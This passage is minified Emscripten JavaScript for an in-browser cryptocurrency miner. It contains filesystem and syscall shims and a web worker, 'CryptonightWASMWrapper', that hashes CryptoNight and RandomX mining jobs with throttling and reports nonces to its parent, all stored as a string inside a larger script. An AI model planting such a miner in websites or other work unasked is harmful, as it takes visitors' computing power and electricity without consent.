FS.mkdir(o,i)},createPath:function(e,t,r,n){e="string"==typeof e?e:FS.getPath(e);for(var o=t.split("/").reverse();o.length;){var i=o.pop();if(i){var a=PATH.join2(e,i);try{FS.mkdir(a)}catch(e){}e=a}}return a},createFile:function(e,t,r,n,o){var i=PATH.join2("string"==typeof e?e:FS.getPath(e),t),a=FS.getMode(n,o);return FS.create(i,a)},createDataFile:function(e,t,r,n,o,i){var a=t?PATH.join2("string"==typeof e?e:FS.getPath(e),t):e,s=FS.getMode(n,o),u=FS.create(a,s);if(r){if("string"==typeof r){for(var l=new Array(r.length),c=0,d=r.length;c<d;++c)l[c]=r.charCodeAt(c);r=l}FS.chmod(u,146|s);var f=FS.open(u,"w");FS.write(f,r,0,r.length,0,i),FS.close(f),FS.chmod(u,s)}return u},createDevice:function(e,t,u,a){var r=PATH.join2("string"==typeof e?e:FS.getPath(e),t),n=FS.getMode(!!u,!!a);FS.createDevice.major||(FS.createDevice.major=64);var o=FS.makedev(FS.createDevice.major++,0);return FS.registerDevice(o,{open:function(e){e.seekable=!1},close:function(e){a&&a.buffer&&a.buffer.length&&a(10)},read:function(e,t,r,n,o){for(var i,a=0,s=0;s<n;s++){try{i=u()}catch(e){throw new FS.ErrnoError(29)}if(void 0===i&&0===a)throw new FS.ErrnoError(6);if(null==i)break;a++,t[r+s]=i}return a&&(e.node.timestamp=Date.now()),a},write:function(e,t,r,n,o){for(var i=0;i<n;i++)try{a(t[r+i])}catch(e){throw new FS.ErrnoError(29)}return n&&(e.node.timestamp=Date.now()),i}}),FS.mkdev(r,n,o)},createLink:function(e,t,r,n,o){var i=PATH.join2("string"==typeof e?e:FS.getPath(e),t);return FS.symlink(r,i)},forceLoadFile:function(e){if(e.isDevice||e.isFolder||e.link||e.contents)return!0;var t=!0;if("undefined"!=typeof XMLHttpRequest)throw new Error("Lazy loading should have been performed (contents set) in createLazyFile, but it was not. Lazy loading only works in web workers. Use --embed-file or --preload-file in emcc on the main thread.");if(!read_)throw new Error("Cannot load without read() or XMLHttpRequest.");try{e.contents=intArrayFromString(read_(e.url),!0),e.usedBytes=e.contents.length}catch(e){t=!1}return t||___setErrNo(29),t},createLazyFile:function(e,t,s,r,n){function o(){this.lengthKnown=!1,this.chunks=[]}if(o.prototype.get=function(e){if(!(e>this.length-1||e<0)){var t=e%this.chunkSize,r=e/this.chunkSize|0;return this.getter(r)[t]}},o.prototype.setDataGetter=function(e){this.getter=e},o.prototype.cacheLength=function(){var e=new XMLHttpRequest;if(e.open("HEAD",s,!1),e.send(null),!(200<=e.status&&e.status<300||304===e.status))throw new Error("Couldn\'t load "+s+". Status: "+e.status);var t,n=Number(e.getResponseHeader("Content-length")),r=(t=e.getResponseHeader("Accept-Ranges"))&&"bytes"===t,o=(t=e.getResponseHeader("Content-Encoding"))&&"gzip"===t,i=1048576;r||(i=n);var a=this;a.setDataGetter(function(e){var t=e*i,r=(e+1)*i-1,r=Math.min(r,n-1);if(void 0===a.chunks[e]&&(a.chunks[e]=function(e,t){if(t<e)throw new Error("invalid range ("+e+", "+t+") or no bytes requested!");if(n-1<t)throw new Error("only "+n+" bytes available! programmer error!");var r=new XMLHttpRequest;if(r.open("GET",s,!1),n!==i&&r.setRequestHeader("Range","bytes="+e+"-"+t),"undefined"!=typeof Uint8Array&&(r.responseType="arraybuffer"),r.overrideMimeType&&r.overrideMimeType("text/plain; charset=x-user-defined"),r.send(null),!(200<=r.status&&r.status<300||304===r.status))throw new Error("Couldn\'t load "+s+". Status: "+r.status);return void 0!==r.response?new Uint8Array(r.response||[]):intArrayFromString(r.responseText||"",!0)}(t,r)),void 0===a.chunks[e])throw new Error("doXHR failed!");return a.chunks[e]}),!o&&n||(i=n=1,n=this.getter(0).length,i=n,console.log("LazyFiles on gzip forces download of the whole file when length is accessed")),this._length=n,this._chunkSize=i,this.lengthKnown=!0},"undefined"!=typeof XMLHttpRequest){if(!ENVIRONMENT_IS_WORKER)throw"Cannot do synchronous binary XHRs outside webworkers in modern browsers. Use --embed-file or --preload-file in emcc";var i=new o;Object.defineProperties(i,{length:{get:function(){return this.lengthKnown||this.cacheLength(),this._length}},chunkSize:{get:function(){return this.lengthKnown||this.cacheLength(),this._chunkSize}}});var a={isDevice:!1,contents:i}}else a={isDevice:!1,url:s};var u=FS.createFile(e,t,a,r,n);a.contents?u.contents=a.contents:a.url&&(u.contents=null,u.url=a.url),Object.defineProperties(u,{usedBytes:{get:function(){return this.contents.length}}});var l={};return Object.keys(u.stream_ops).forEach(function(e){var t=u.stream_ops[e];l[e]=function(){if(!FS.forceLoadFile(u))throw new FS.ErrnoError(29);return t.apply(null,arguments)}}),l.read=function(e,t,r,n,o){if(!FS.forceLoadFile(u))throw new FS.ErrnoError(29);var i=e.node.contents;if(o>=i.length)return 0;var a=Math.min(i.length-o,n);if(i.slice)for(var s=0;s<a;s++)t[r+s]=i[o+s];else for(s=0;s<a;s++)t[r+s]=i.get(o+s);return a},u.stream_ops=l,u},createPreloadedFile:function(o,i,e,a,s,u,l,c,d,f){Browser.init();var h=i?PATH_FS.resolve(PATH.join2(o,i)):o,p=getUniqueRunDependency("cp "+h);function t(t){function r(e){f&&f(),c||FS.createDataFile(o,i,e,a,s,d),u&&u(),removeRunDependency(p)}var n=!1;Module.preloadPlugins.forEach(function(e){n||e.canHandle(h)&&(e.handle(t,h,r,function(){l&&l(),removeRunDependency(p)}),n=!0)}),n||r(t)}addRunDependency(p),"string"==typeof e?Browser.asyncLoad(e,function(e){t(e)},l):t(e)},indexedDB:function(){return window.indexedDB||window.mozIndexedDB||window.webkitIndexedDB||window.msIndexedDB},DB_NAME:function(){return"EM_FS_"+window.location.pathname},DB_VERSION:20,DB_STORE_NAME:"FILE_DATA",saveFilesToDB:function(t,s,u){s=s||function(){},u=u||function(){};var e=FS.indexedDB();try{var l=e.open(FS.DB_NAME(),FS.DB_VERSION)}catch(e){return u(e)}l.onupgradeneeded=function(){console.log("creating db"),l.result.createObjectStore(FS.DB_STORE_NAME)},l.onsuccess=function(){var e=l.result.transaction([FS.DB_STORE_NAME],"readwrite"),r=e.objectStore(FS.DB_STORE_NAME),n=0,o=0,i=t.length;function a(){(0==o?s:u)()}t.forEach(function(e){var t=r.put(FS.analyzePath(e).object.contents,e);t.onsuccess=function(){++n+o==i&&a()},t.onerror=function(){n+ ++o==i&&a()}}),e.onerror=u},l.onerror=u},loadFilesFromDB:function(s,u,l){u=u||function(){},l=l||function(){};var e=FS.indexedDB();try{var c=e.open(FS.DB_NAME(),FS.DB_VERSION)}catch(e){return l(e)}c.onupgradeneeded=l,c.onsuccess=function(){var e=c.result;try{var t=e.transaction([FS.DB_STORE_NAME],"readonly")}catch(e){return void l(e)}var r=t.objectStore(FS.DB_STORE_NAME),n=0,o=0,i=s.length;function a(){(0==o?u:l)()}s.forEach(function(e){var t=r.get(e);t.onsuccess=function(){FS.analyzePath(e).exists&&FS.unlink(e),FS.createDataFile(PATH.dirname(e),PATH.basename(e),t.result,!0,!0,!0),++n+o==i&&a()},t.onerror=function(){n+ ++o==i&&a()}}),t.onerror=l},c.onerror=l}},SYSCALLS={DEFAULT_POLLMASK:5,mappings:{},umask:511,calculateAt:function(e,t){if("/"!==t[0]){var r;if(-100===e)r=FS.cwd();else{var n=FS.getStream(e);if(!n)throw new FS.ErrnoError(8);r=n.path}t=PATH.join2(r,t)}return t},doStat:function(e,t,r){try{var n=e(t)}catch(e){if(e&&e.node&&PATH.normalize(t)!==PATH.normalize(FS.getPath(e.node)))return-54;throw e}return HEAP32[r>>2]=n.dev,HEAP32[r+4>>2]=0,HEAP32[r+8>>2]=n.ino,HEAP32[r+12>>2]=n.mode,HEAP32[r+16>>2]=n.nlink,HEAP32[r+20>>2]=n.uid,HEAP32[r+24>>2]=n.gid,HEAP32[r+28>>2]=n.rdev,HEAP32[r+32>>2]=0,tempI64=[n.size>>>0,(tempDouble=n.size,1<=+Math_abs(tempDouble)?0<tempDouble?(0|Math_min(+Math_floor(tempDouble/4294967296),4294967295))>>>0:~~+Math_ceil((tempDouble-(~~tempDouble>>>0))/4294967296)>>>0:0)],HEAP32[r+40>>2]=tempI64[0],HEAP32[r+44>>2]=tempI64[1],HEAP32[r+48>>2]=4096,HEAP32[r+52>>2]=n.blocks,HEAP32[r+56>>2]=n.atime.getTime()/1e3|0,HEAP32[r+60>>2]=0,HEAP32[r+64>>2]=n.mtime.getTime()/1e3|0,HEAP32[r+68>>2]=0,HEAP32[r+72>>2]=n.ctime.getTime()/1e3|0,HEAP32[r+76>>2]=0,tempI64=[n.ino>>>0,(tempDouble=n.ino,1<=+Math_abs(tempDouble)?0<tempDouble?(0|Math_min(+Math_floor(tempDouble/4294967296),4294967295))>>>0:~~+Math_ceil((tempDouble-(~~tempDouble>>>0))/4294967296)>>>0:0)],HEAP32[r+80>>2]=tempI64[0],HEAP32[r+84>>2]=tempI64[1],0},doMsync:function(e,t,r,n){var o=new Uint8Array(HEAPU8.subarray(e,e+r));FS.msync(t,o,0,r,n)},doMkdir:function(e,t){return"/"===(e=PATH.normalize(e))[e.length-1]&&(e=e.substr(0,e.length-1)),FS.mkdir(e,t,0),0},doMknod:function(e,t,r){switch(61440&t){case 32768:case 8192:case 24576:case 4096:case 49152:break;default:return-28}return FS.mknod(e,t,r),0},doReadlink:function(e,t,r){if(r<=0)return-28;var n=FS.readlink(e),o=Math.min(r,lengthBytesUTF8(n)),i=HEAP8[t+o];return stringToUTF8(n,t,r+1),HEAP8[t+o]=i,o},doAccess:function(e,t){if(-8&t)return-28;var r=FS.lookupPath(e,{follow:!0}).node;if(!r)return-44;var n="";return 4&t&&(n+="r"),2&t&&(n+="w"),1&t&&(n+="x"),n&&FS.nodePermissions(r,n)?-2:0},doDup:function(e,t,r){var n=FS.getStream(r);return n&&FS.close(n),FS.open(e,t,0,r,r).fd},doReadv:function(e,t,r,n){for(var o=0,i=0;i<r;i++){var a=HEAP32[t+8*i>>2],s=HEAP32[t+(8*i+4)>>2],u=FS.read(e,HEAP8,a,s,n);if(u<0)return-1;if(o+=u,u<s)break}return o},doWritev:function(e,t,r,n){for(var o=0,i=0;i<r;i++){var a=HEAP32[t+8*i>>2],s=HEAP32[t+(8*i+4)>>2],u=FS.write(e,HEAP8,a,s,n);if(u<0)return-1;o+=u}return o},varargs:0,get:function(e){return SYSCALLS.varargs+=4,HEAP32[SYSCALLS.varargs-4>>2]},getStr:function(){return UTF8ToString(SYSCALLS.get())},getStreamFromFD:function(e){void 0===e&&(e=SYSCALLS.get());var t=FS.getStream(e);if(!t)throw new FS.ErrnoError(8);return t},get64:function(){var e=SYSCALLS.get();SYSCALLS.get();return e},getZero:function(){SYSCALLS.get()}},PROCINFO={ppid:1,pid:42,sid:42,pgid:42};function ___syscall20(e,t){SYSCALLS.varargs=t;try{return PROCINFO.pid}catch(e){return void 0!==FS&&e instanceof FS.ErrnoError||abort(e),-e.errno}}function __emscripten_syscall_munmap(e,t){if(-1===e||0===t)return-28;var r,n=SYSCALLS.mappings[e];return n&&t===n.len&&(r=FS.getStream(n.fd),SYSCALLS.doMsync(e,r,t,n.flags),FS.munmap(r),SYSCALLS.mappings[e]=null,n.allocated&&_free(n.malloc)),0}function ___syscall91(e,t){SYSCALLS.varargs=t;try{return __emscripten_syscall_munmap(SYSCALLS.get(),SYSCALLS.get())}catch(e){return void 0!==FS&&e instanceof FS.ErrnoError||abort(e),-e.errno}}function _exit(e){exit(e)}function __exit(e){return _exit(e)}function _abort(){abort()}function _emscripten_get_heap_size(){return HEAP8.length}function _emscripten_memcpy_big(e,t,r){HEAPU8.set(HEAPU8.subarray(t,t+r),e)}function abortOnCannotGrowMemory(e){abort("OOM")}function _emscripten_resize_heap(e){abortOnCannotGrowMemory(e)}var ENV={};function _emscripten_get_environ(){if(!_emscripten_get_environ.strings){var e={USER:"web_user",LOGNAME:"web_user",PATH:"/",PWD:"/",HOME:"/home/web_user",LANG:("object"==typeof navigator&&navigator.languages&&navigator.languages[0]||"C").replace("-","_")+".UTF-8",_:thisProgram};for(t in ENV)e[t]=ENV[t];var t,r=[];for(t in e)r.push(t+"="+e[t]);_emscripten_get_environ.strings=r}return _emscripten_get_environ.strings}function _environ_get(n,o){var e=_emscripten_get_environ(),i=0;return e.forEach(function(e,t){var r=o+i;writeAsciiToMemory(e,HEAP32[n+4*t>>2]=r),i+=e.length+1}),0}function _environ_sizes_get(e,t){var r=_emscripten_get_environ();HEAP32[e>>2]=r.length;var n=0;return r.forEach(function(e){n+=e.length+1}),HEAP32[t>>2]=n,0}function _fd_close(e){try{var t=SYSCALLS.getStreamFromFD(e);return FS.close(t),0}catch(e){return void 0!==FS&&e instanceof FS.ErrnoError||abort(e),e.errno}}function _fd_seek(e,t,r,n,o){try{var i=SYSCALLS.getStreamFromFD(e),a=4294967296*r+(t>>>0),s=9007199254740992;return a<=-s||s<=a?-61:(FS.llseek(i,a,n),tempI64=[i.position>>>0,(tempDouble=i.position,1<=+Math_abs(tempDouble)?0<tempDouble?(0|Math_min(+Math_floor(tempDouble/4294967296),4294967295))>>>0:~~+Math_ceil((tempDouble-(~~tempDouble>>>0))/4294967296)>>>0:0)],HEAP32[o>>2]=tempI64[0],HEAP32[o+4>>2]=tempI64[1],i.getdents&&0==a&&0===n&&(i.getdents=null),0)}catch(e){return void 0!==FS&&e instanceof FS.ErrnoError||abort(e),e.errno}}function _fd_write(e,t,r,n){try{var o=SYSCALLS.getStreamFromFD(e),i=SYSCALLS.doWritev(o,t,r);return HEAP32[n>>2]=i,0}catch(e){return void 0!==FS&&e instanceof FS.ErrnoError||abort(e),e.errno}}function _ftime(e){var t=Date.now();return HEAP32[e>>2]=t/1e3|0,HEAP16[e+4>>1]=t%1e3,HEAP16[e+6>>1]=0,HEAP16[e+8>>1]=0}var ___tm_current=26080,___tm_timezone=(stringToUTF8("GMT",26128,4),26128);function _gmtime_r(e,t){var r=new Date(1e3*HEAP32[e>>2]);HEAP32[t>>2]=r.getUTCSeconds(),HEAP32[t+4>>2]=r.getUTCMinutes(),HEAP32[t+8>>2]=r.getUTCHours(),HEAP32[t+12>>2]=r.getUTCDate(),HEAP32[t+16>>2]=r.getUTCMonth(),HEAP32[t+20>>2]=r.getUTCFullYear()-1900,HEAP32[t+24>>2]=r.getUTCDay(),HEAP32[t+36>>2]=0,HEAP32[t+32>>2]=0;var n=Date.UTC(r.getUTCFullYear(),0,1,0,0,0,0),o=(r.getTime()-n)/864e5|0;return HEAP32[t+28>>2]=o,HEAP32[t+40>>2]=___tm_timezone,t}function _gmtime(e){return _gmtime_r(e,___tm_current)}function intArrayFromString(e,t,r){var n=0<r?r:lengthBytesUTF8(e)+1,o=new Array(n),i=stringToUTF8Array(e,o,0,o.length);return t&&(o.length=i),o}FS.staticInit();var asmLibraryArg={a:___assert_fail,c:___cxa_allocate_exception,b:___cxa_throw,e:___syscall20,p:___syscall91,h:__exit,d:_abort,l:_emscripten_memcpy_big,m:_emscripten_resize_heap,n:_environ_get,o:_environ_sizes_get,f:_fd_close,k:_fd_seek,g:_fd_write,j:_ftime,i:_gmtime,memory:wasmMemory,table:wasmTable},asm=createWasm();Module.asm=asm;var calledRun,___wasm_call_ctors=Module.___wasm_call_ctors=function(){return Module.asm.q.apply(null,arguments)},_free=Module._free=function(){return Module.asm.r.apply(null,arguments)},_malloc=Module._malloc=function(){return Module.asm.s.apply(null,arguments)},_rx_slow_hash=Module._rx_slow_hash=function(){return Module.asm.t.apply(null,arguments)},_cn_slow_hash=Module._cn_slow_hash=function(){return Module.asm.u.apply(null,arguments)},_minero_verify=Module._minero_verify=function(){return Module.asm.v.apply(null,arguments)},___errno_location=Module.___errno_location=function(){return Module.asm.w.apply(null,arguments)},__ZSt18uncaught_exceptionv=Module.__ZSt18uncaught_exceptionv=function(){return Module.asm.x.apply(null,arguments)},stackAlloc=Module.stackAlloc=function(){return Module.asm.y.apply(null,arguments)},dynCall_vi=Module.dynCall_vi=function(){return Module.asm.z.apply(null,arguments)},dynCall_v=Module.dynCall_v=function(){return Module.asm.A.apply(null,arguments)};function ExitStatus(e){this.name="ExitStatus",this.message="Program terminated with exit("+e+")",this.status=e}function run(e){function t(){calledRun||(calledRun=!0,ABORT||(initRuntime(),preMain(),Module.onRuntimeInitialized&&Module.onRuntimeInitialized(),postRun()))}0<runDependencies||(preRun(),0<runDependencies||(Module.setStatus?(Module.setStatus("Running..."),setTimeout(function(){setTimeout(function(){Module.setStatus("")},1),t()},1)):t()))}function exit(e,t){t&&noExitRuntime&&0===e||(noExitRuntime||(ABORT=!0,EXITSTATUS=e,exitRuntime(),Module.onExit&&Module.onExit(e)),quit_(e,new ExitStatus(e)))}if(Module.asm=asm,dependenciesFulfilled=function e(){calledRun||run(),calledRun||(dependenciesFulfilled=e)},Module.run=run,Module.preInit)for("function"==typeof Module.preInit&&(Module.preInit=[Module.preInit]);0<Module.preInit.length;)Module.preInit.pop()();noExitRuntime=!0,run();var CryptonightWASMWrapper=function(){this.throttleWait=0,this.throttledStart=0,this.throttledHashes=0,this.workThrottledBound=this.workThrottled.bind(this),this.currentJob=null,this.target=new Uint8Array([255,255,255,255,255,255,255,255]),this.variant=0,this.height=0;var e=Module.HEAPU8.buffer;this.input=new Uint8Array(e,Module._malloc(84),84),this.output=new Uint8Array(e,Module._malloc(32),32),this.seed_input=new Uint8Array(e,Module._malloc(32),32),self.postMessage("ready"),self.onmessage=this.onMessage.bind(this)};CryptonightWASMWrapper.prototype.onMessage=function(e){var t=e.data;t.verify_id?this.verify(t):(this.currentJob&&this.currentJob.job_id===t.job_id||this.setJob(t),t.throttle?(this.throttleWait=1/(1-t.throttle)-1,this.throttledStart=this.now(),this.throttledHashes=0,this.workThrottled()):this.work())},CryptonightWASMWrapper.prototype.destroy=function(){},CryptonightWASMWrapper.prototype.hexToBytes=function(e,t){for(var t=new Uint8Array(e.length/2),r=0,n=0;n<e.length;n+=2,r++)t[r]=parseInt(e.substr(n,2),16);return t},CryptonightWASMWrapper.prototype.bytesToHex=function(e){for(var t="",r=0;r<e.length;r++)t+=(e[r]>>>4).toString(16),t+=(15&e[r]).toString(16);return t},CryptonightWASMWrapper.prototype.meetsTarget=function(e,t){for(var r=0;r<t.length;r++){var n=e.length-r-1,o=t.length-r-1;if(e[n]>t[o])return!1;if(e[n]<t[o])return!0}return!1},CryptonightWASMWrapper.prototype.setJob=function(e){this.currentJob=e,this.blob=this.hexToBytes(e.blob),this.input.set(this.blob);var t=this.hexToBytes(e.target);if(t.length<=8){for(var r=0;r<t.length;r++)this.target[this.target.length-r-1]=t[t.length-r-1];for(r=0;r<this.target.length-t.length;r++)this.target[r]=255}else this.target=t;this.variant=void 0===e.variant?0:e.variant,this.height=void 0===e.height?0:e.height,this.seed_blob=this.hexToBytes(e.seed_hash),this.seed_input.set(this.seed_blob)},CryptonightWASMWrapper.prototype.now=function(){return self.performance?self.performance.now():Date.now()},CryptonightWASMWrapper.prototype.hash=function(e,t,r,n,o,i){var a=4294967295*Math.random()+1>>>0;this.input[39]=(4278190080&a)>>24,this.input[40]=(16711680&a)>>16,this.input[41]=(65280&a)>>8,this.input[42]=(255&a)>>0,i?_rx_slow_hash(o,o,i.byteOffset,e.byteOffset,r,t.byteOffset,0,0):_cn_slow_hash(e.byteOffset,r,t.byteOffset,n,0,o)},CryptonightWASMWrapper.prototype.verify=function(e){this.blob=this.hexToBytes(e.blob),this.input.set(this.blob);for(var t=0,r=0;r<e.nonce.length;r+=2,t++)this.input[39+t]=parseInt(e.nonce.substr(r,2),16);this.variant=void 0===e.variant?0:e.variant,this.height=void 0===e.height?0:e.height,_minero_verify(this.input.byteOffset,this.blob.length,this.output.byteOffset,this.variant,0,this.height);var n=this.bytesToHex(this.output);self.postMessage({verify_id:e.verify_id,result:n})},CryptonightWASMWrapper.prototype.work=function(){for(var e=0,t=!1,r=this.now(),n=0;this.hash(this.input,this.output,this.blob.length,this.variant,this.height,this.seed_input),e++,t=this.meetsTarget(this.output,this.target),n=this.now()-r,!t&&n<1e3;);var o,i,a=e/(n/1e3);t?(o=this.bytesToHex(this.input.subarray(39,43)),i=this.bytesToHex(this.output),self.postMessage({hashesPerSecond:a,hashes:e,job_id:this.currentJob.job_id,nonce:o,result:i})):self.postMessage({hashesPerSecond:a,hashes:e})},CryptonightWASMWrapper.prototype.workThrottled=function(){var e=this.now();this.hash(this.input,this.output,this.blob.length,this.variant,this.height,this.seed_input);var t=this.now(),r=t-e;this.throttledHashes++;var n,o,i,a=t-this.throttledStart,s=this.throttledHashes/(a/1e3);this.meetsTarget(this.output,this.target)?(n=this.bytesToHex(this.input.subarray(39,43)),o=this.bytesToHex(this.output),self.postMessage({hashesPerSecond:s,hashes:this.throttledHashes,job_id:this.currentJob.job_id,nonce:n,result:o}),this.throttledHashes=0):1e3<a?(self.postMessage({hashesPerSecond:s,hashes:this.throttledHashes}),this.throttledHashes=0):(i=Math.min(2e3,r*this.throttleWait),setTimeout(this.workThrottledBound,i))},Module.onRuntimeInitialized=function(){new CryptonightWASMWrapper};',
    ])
  ));
